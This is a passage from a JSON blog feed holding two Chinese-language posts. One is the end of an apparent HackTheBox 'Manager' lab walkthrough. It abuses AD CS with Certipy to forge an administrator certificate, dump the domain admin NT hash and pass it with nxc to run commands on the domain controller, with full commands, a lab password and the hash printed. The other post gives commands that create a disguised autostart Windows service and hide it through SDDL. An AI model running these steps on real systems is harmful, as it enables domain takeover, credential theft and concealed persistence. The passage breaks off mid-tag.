number\">10.10</span>.11.236'</pre></td></tr></table></figure><p>​\t\t\t\t<strong>执行结果如下：</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span> .<span class=\"token punctuation\">\\</span>certipy.exe ca <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> -add-officer raven <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Certipy v4.8.2 - by Oliver Lyak <span class=\"token punctuation\">(</span>ly4k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Successfully added officer <span class=\"token string\">'Raven'</span> on <span class=\"token string\">'manager-DC01-CA'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span></pre></td></tr></table></figure><h4 id=\"222启用证书模板\"><a class=\"anchor\" href=\"#222启用证书模板\">#</a> 2.2.2. 启用证书模板</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>certipy.exe ca <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> -enable-template SubCA <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> -dc-ip <span class=\"token number\">10.10</span>.11.236'</pre></td></tr></table></figure><p>​\t\t\t\t<strong>执行结果如下:</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span> .<span class=\"token punctuation\">\\</span>certipy.exe ca <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> -enable-template SubCA <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Certipy v4.8.2 - by Oliver Lyak <span class=\"token punctuation\">(</span>ly4k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Successfully enabled <span class=\"token string\">'SubCA'</span> on <span class=\"token string\">'manager-DC01-CA'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span></pre></td></tr></table></figure><h4 id=\"223请求证书但是会被拒绝拒绝后保存私钥和请求id\"><a class=\"anchor\" href=\"#223请求证书但是会被拒绝拒绝后保存私钥和请求id\">#</a> 2.2.3. 请求证书，但是会被拒绝，拒绝后保存私钥和请求 ID</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>certipy.exe req <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> <span class=\"token parameter variable\">-target</span> manager.htb <span class=\"token parameter variable\">-template</span> SubCA <span class=\"token parameter variable\">-upn</span> administrator@manager.htb -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr></table></figure><p>​\t\t\t\t<strong>执行结果如下:</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span> certipy req <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> <span class=\"token parameter variable\">-target</span> manager.htb <span class=\"token parameter variable\">-template</span> SubCA <span class=\"token parameter variable\">-upn</span> administrator@manager.htb -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Certipy v4.8.2 - by Oliver Lyak <span class=\"token punctuation\">(</span>ly4k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Requesting certificate via RPC</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span> Got error <span class=\"token keyword\">while</span> trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template <span class=\"token keyword\">do</span> not allow the current user to enroll <span class=\"token keyword\">for</span> this <span class=\"token builtin class-name\">type</span> of certificate.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Request ID is <span class=\"token number\">26</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Would you like to save the private key? <span class=\"token punctuation\">(</span>y/N<span class=\"token punctuation\">)</span> y</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Saved private key to <span class=\"token number\">26</span>.key</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span> Failed to request certificate</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span></pre></td></tr></table></figure><h4 id=\"224签发和批准证书\"><a class=\"anchor\" href=\"#224签发和批准证书\">#</a> 2.2.4. 签发和批准证书</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>certipy.exe ca <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> -issue-request <span class=\"token number\">26</span> <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr></table></figure><p>​\t\t\t\t<strong>执行结果如下:</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span> .<span class=\"token punctuation\">\\</span>certipy.exe ca <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> -issue-request <span class=\"token number\">26</span> <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Certipy v4.8.2 - by Oliver Lyak <span class=\"token punctuation\">(</span>ly4k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Successfully issued certificate</pre></td></tr></table></figure><h4 id=\"225请求签发的证书id下载对应证书凭证文件administratorpfx\"><a class=\"anchor\" href=\"#225请求签发的证书id下载对应证书凭证文件administratorpfx\">#</a> 2.2.5. 请求签发的证书 ID，下载对应证书凭证文件 (administrator.pfx)</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>certipy req <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> <span class=\"token parameter variable\">-target</span> manager.htb <span class=\"token parameter variable\">-retrieve</span> <span class=\"token number\">26</span> -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr></table></figure><p>​\t\t\t\t<strong>执行结果如下:</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span> certipy req <span class=\"token parameter variable\">-username</span> raven@manager.htb <span class=\"token parameter variable\">-password</span> <span class=\"token string\">'R4v3nBe5tD3veloP3r!123'</span> <span class=\"token parameter variable\">-ca</span> <span class=\"token string\">'manager-DC01-CA'</span> <span class=\"token parameter variable\">-target</span> manager.htb <span class=\"token parameter variable\">-retrieve</span> <span class=\"token number\">26</span> -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Certipy v4.8.2 - by Oliver Lyak <span class=\"token punctuation\">(</span>ly4k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Rerieving certificate with ID <span class=\"token number\">26</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Successfully retrieved certificate</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Got certificate with UPN <span class=\"token string\">'administrator@manager.htb'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Certificate has no object SID</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Loaded private key from <span class=\"token string\">'26.key'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Saved certificate and private key to <span class=\"token string\">'administrator.pfx'</span></pre></td></tr></table></figure><h3 id=\"23导出hashpth横向\"><a class=\"anchor\" href=\"#23导出hashpth横向\">#</a> 2.3. 导出 hash，pth 横向</h3>\n<h4 id=\"231与域控时间同步不然无法登录\"><a class=\"anchor\" href=\"#231与域控时间同步不然无法登录\">#</a> 2.3.1. 与域控时间同步，不然无法登录</h4>\n<p><strong>linux 同步命令：</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> ntpdate <span class=\"token parameter variable\">-s</span> <span class=\"token number\">10.10</span>.11.236 <span class=\"token comment\">#ip 为域控 ip</span></pre></td></tr></table></figure><p><strong>win 同步命令：</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sc start w32time <span class=\"token comment\">#启动服务</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>w32tm /config /manualpeerlist:<span class=\"token string\">\"10.129.102.122\"</span> /syncfromflags:manual /reliable:YES /update <span class=\"token comment\">#同步域控时间，ip 为域控 ip</span></pre></td></tr></table></figure><h4 id=\"232通过下载好的证书认证文件dump域管hash\"><a class=\"anchor\" href=\"#232通过下载好的证书认证文件dump域管hash\">#</a> 2.3.2. 通过下载好的证书认证文件 dump 域管 hash</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>certipy auth <span class=\"token parameter variable\">-pfx</span> <span class=\"token string\">'administrator.pfx'</span> <span class=\"token parameter variable\">-username</span> <span class=\"token string\">'administrator'</span> <span class=\"token parameter variable\">-domain</span> <span class=\"token string\">'manager.htb'</span> -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr></table></figure><p><strong>执行结果如下：</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PS D:<span class=\"token punctuation\">\\</span>miniconda<span class=\"token punctuation\">\\</span>Scripts<span class=\"token operator\">></span> certipy auth <span class=\"token parameter variable\">-pfx</span> <span class=\"token string\">'administrator.pfx'</span> <span class=\"token parameter variable\">-username</span> <span class=\"token string\">'administrator'</span> <span class=\"token parameter variable\">-domain</span> <span class=\"token string\">'manager.htb'</span> -dc-ip <span class=\"token number\">10.10</span>.11.236</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Certipy v4.8.2 - by Oliver Lyak <span class=\"token punctuation\">(</span>ly4k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Using principal: administrator@manager.htb</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Trying to get TGT<span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Got TGT</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Saved credential cache to <span class=\"token string\">'administrator.ccache'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Trying to retrieve NT <span class=\"token builtin class-name\">hash</span> <span class=\"token keyword\">for</span> <span class=\"token string\">'administrator'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Got <span class=\"token builtin class-name\">hash</span> <span class=\"token keyword\">for</span> <span class=\"token string\">'administrator@manager.htb'</span><span class=\"token builtin class-name\">:</span> aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef</pre></td></tr></table></figure><h4 id=\"233pthhash横向拿下域控\"><a class=\"anchor\" href=\"#233pthhash横向拿下域控\">#</a> 2.3.3.pth/hash 横向拿下域控</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nxc.exe wmi <span class=\"token number\">10.10</span>.11.236 <span class=\"token parameter variable\">-u</span> administrator <span class=\"token parameter variable\">-H</span> ae5064c2f62317332c88629e025924ef <span class=\"token parameter variable\">-x</span> <span class=\"token string\">'whoami'</span></pre></td></tr></table></figure><p><strong>执行结果如下：</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PS E:<span class=\"token punctuation\">\\</span>渗透工具<span class=\"token punctuation\">\\</span>提权+内网<span class=\"token punctuation\">\\</span>密码喷洒<span class=\"token operator\">></span> .<span class=\"token punctuation\">\\</span>nxc.exe wmi <span class=\"token number\">10.10</span>.11.236 <span class=\"token parameter variable\">-u</span> administrator <span class=\"token parameter variable\">-H</span> ae5064c2f62317332c88629e025924ef <span class=\"token parameter variable\">-x</span> <span class=\"token string\">'whoami'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>RPC         <span class=\"token number\">10.10</span>.11.236    <span class=\"token number\">135</span>    DC01             <span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Windows NT <span class=\"token number\">10.0</span> Build <span class=\"token number\">17763</span> <span class=\"token punctuation\">(</span>name:DC01<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>domain:manager.htb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>WMI         <span class=\"token number\">10.10</span>.11.236    <span class=\"token number\">135</span>    DC01             <span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> manager.htb<span class=\"token punctuation\">\\</span>administrator:ae5064c2f62317332c88629e025924ef <span class=\"token punctuation\">(</span>Pwn3d<span class=\"token operator\">!</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>WMI         <span class=\"token number\">10.10</span>.11.236    <span class=\"token number\">135</span>    DC01             <span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> Executed command: <span class=\"token string\">\"whoami\"</span> via wmiexec</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>WMI         <span class=\"token number\">10.10</span>.11.236    <span class=\"token number\">135</span>    DC01             manager<span class=\"token punctuation\">\\</span>administrator</pre></td></tr></table></figure><h2 id=\"三注意与踩坑\"><a class=\"anchor\" href=\"#三注意与踩坑\">#</a> 三。注意与踩坑</h2>\n<h3 id=\"1221创建证书处\"><a class=\"anchor\" href=\"#1221创建证书处\">#</a> 1. <code>2.2.1.创建证书</code> 处：</h3>\n<p><strong>ca 名称（-ca 'manager-DC01-CA'），需要从 <code>2.1.查看域用户配置</code> ，响应结果中的 ca name 中拿到</strong></p>\n<h3 id=\"2224签发和批准证书处\"><a class=\"anchor\" href=\"#2224签发和批准证书处\">#</a> 2. <code>2.2.4.签发和批准证书</code> 处：</h3>\n<p><strong>请求的证书 id（-issue-request 26），需要从 <code>2.2.3.请求证书</code> ，响应结果中拿到</strong></p>\n<h3 id=\"3时间同步\"><a class=\"anchor\" href=\"#3时间同步\">#</a> 3. 时间同步</h3>\n<p><strong>必须与域控时间同步，不然无法登录（ <code>2.3.1.与域控时间同步</code> ）</strong></p>\n<p><strong>番外：</strong></p>\n<p><strong>Certipy 命令</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Certipy v4.0.0 - by Oliver Lyak <span class=\"token punctuation\">(</span>ly4k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>usage: certipy shadow <span class=\"token punctuation\">[</span>-h<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-account target account<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-device-id DEVICE_ID<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-debug<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-out output <span class=\"token function\">file</span> name<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-scheme ldap scheme<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-dc-ip <span class=\"token function\">ip</span> address<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-target-ip <span class=\"token function\">ip</span> address<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-target dns/ip address<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-ns nameserver<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-dns-tcp<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-timeout seconds<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-u username@domain<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                      <span class=\"token punctuation\">[</span>-p password<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-hashes <span class=\"token punctuation\">[</span>LMHASH:<span class=\"token punctuation\">]</span>NTHASH<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-k<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-sspi<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-aes hex key<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-no-pass<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                      <span class=\"token punctuation\">&#123;</span>list,add,remove,clear,info,auto<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>positional arguments:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span>list,add,remove,clear,info,auto<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                        Key Credentials action</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>optional arguments:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  -h, <span class=\"token parameter variable\">--help</span>            show this <span class=\"token builtin class-name\">help</span> message and <span class=\"token builtin class-name\">exit</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token parameter variable\">-account</span> target account</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                        Account to target. If omitted, the user specified <span class=\"token keyword\">in</span> the target will be used</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  -device-id DEVICE_ID  Device ID of the Key Credential Link</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token parameter variable\">-debug</span>                Turn debug output on</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>output options:</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token parameter variable\">-out</span> output <span class=\"token function\">file</span> name</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>connection options:</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token parameter variable\">-scheme</span> ldap scheme</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  -dc-ip <span class=\"token function\">ip</span> address     IP Address of the domain controller. If omitted it will use the domain part <span class=\"token punctuation\">(</span>FQDN<span class=\"token punctuation\">)</span> specified <span class=\"token keyword\">in</span> the target parameter</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  -target-ip <span class=\"token function\">ip</span> address</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token parameter variable\">-target</span> dns/ip address</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                        DNS Name or IP Address of the target machine. Required <span class=\"token keyword\">for</span> Kerberos or SSPI authentication</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token parameter variable\">-ns</span> nameserver        Nameserver <span class=\"token keyword\">for</span> DNS resolution</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  -dns-tcp              Use TCP instead of UDP <span class=\"token keyword\">for</span> DNS queries</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token parameter variable\">-timeout</span> seconds      Timeout <span class=\"token keyword\">for</span> connections</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>authentication options:</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token parameter variable\">-u</span> username@domain, <span class=\"token parameter variable\">-username</span> username@domain</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                        Username. Format: username@domain</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token parameter variable\">-p</span> password, <span class=\"token parameter variable\">-password</span> password</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                        Password</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token parameter variable\">-hashes</span> <span class=\"token punctuation\">[</span>LMHASH:<span class=\"token punctuation\">]</span>NTHASH</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                        NTLM hash, <span class=\"token function\">format</span> is <span class=\"token punctuation\">[</span>LMHASH:<span class=\"token punctuation\">]</span>NTHASH</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token parameter variable\">-k</span>                    Use Kerberos authentication. Grabs credentials from ccache <span class=\"token function\">file</span> <span class=\"token punctuation\">(</span>KRB5CCNAME<span class=\"token punctuation\">)</span> based on target parameters. If valid credentials cannot be found, it will use the ones specified <span class=\"token keyword\">in</span> the <span class=\"token builtin class-name\">command</span> line</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token parameter variable\">-sspi</span>                 Use Windows Integrated Authentication <span class=\"token punctuation\">(</span>SSPI<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token parameter variable\">-aes</span> hex key          AES key to use <span class=\"token keyword\">for</span> Kerberos Authentication <span class=\"token punctuation\">(</span><span class=\"token number\">128</span> or <span class=\"token number\">256</span> bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  -no-pass              Don't ask <span class=\"token keyword\">for</span> password <span class=\"token punctuation\">(</span>useful <span class=\"token keyword\">for</span> <span class=\"token parameter variable\">-k</span> and -sspi<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "域控提权"
            ]
        },
        {
            "id": "https://zlte.netlify.app/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "url": "https://zlte.netlify.app/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "title": "win权限维持/安全描述符权限维持",
            "date_published": "2024-01-21T16:30:34.000Z",
            "content_html": "<p><strong>竹林寺</strong></p>\n<p><strong>cmd powershell 选其一</strong></p>\n<h2 id=\"1cmd创建自启动服务\"><a class=\"anchor\" href=\"#1cmd创建自启动服务\">#</a> 1.cmd 创建自启动服务</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sc create <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> <span class=\"token assign-left variable\">binpath</span><span class=\"token operator\">=</span> <span class=\"token string\">\"cmd.exe /k C:<span class=\"token entity\" title=\"\\t\">\\t</span>est.txt\"</span> <span class=\"token assign-left variable\">depend</span><span class=\"token operator\">=</span> Tcpip <span class=\"token assign-left variable\">obj</span><span class=\"token operator\">=</span> Localsystem <span class=\"token assign-left variable\">start</span><span class=\"token operator\">=</span> auto</pre></td></tr></table></figure><h2 id=\"2-powershell创建自启动服务\"><a class=\"anchor\" href=\"#2-powershell创建自启动服务\">#</a> 2. powershell 创建自启动服务</h2>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">new-service</span> –Name <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> –DisplayName <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> –BinaryPathName <span class=\"token string\">\"cmd.exe /k C:\\test.txt\"</span> – StartupType AutomaticDelayedStart  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token function\">new-service</span> –Name <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> –DisplayName <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> –BinaryPathName <span class=\"token string\">\"cmd.exe /k C:\\test.txt\"</span> –StartupType AutomaticDelayedStart</pre></td></tr></table></figure><h2 id=\"3-通过修改sddl安全描述符隐藏服务\"><a class=\"anchor\" href=\"#3-通过修改sddl安全描述符隐藏服务\">#</a> 3. 通过修改 SDDL (安全描述符) 隐藏服务</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sc sdset <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> <span class=\"token string\">\"D:(D;;DCLCWPDTSD;;;IU) (D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU) (A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY) (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"</span></pre></td></tr></table></figure><h2 id=\"4-然后通过sc与get-server查找服务均无结果\"><a class=\"anchor\" href=\"#4-然后通过sc与get-server查找服务均无结果\">#</a> 4. 然后通过 sc 与 get-server 查找服务均无结果：</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sc query <span class=\"token operator\">|</span>findstr <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>get-service <span class=\"token operator\">|</span> findstr <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span></pre></td></tr></table></figure><p><img 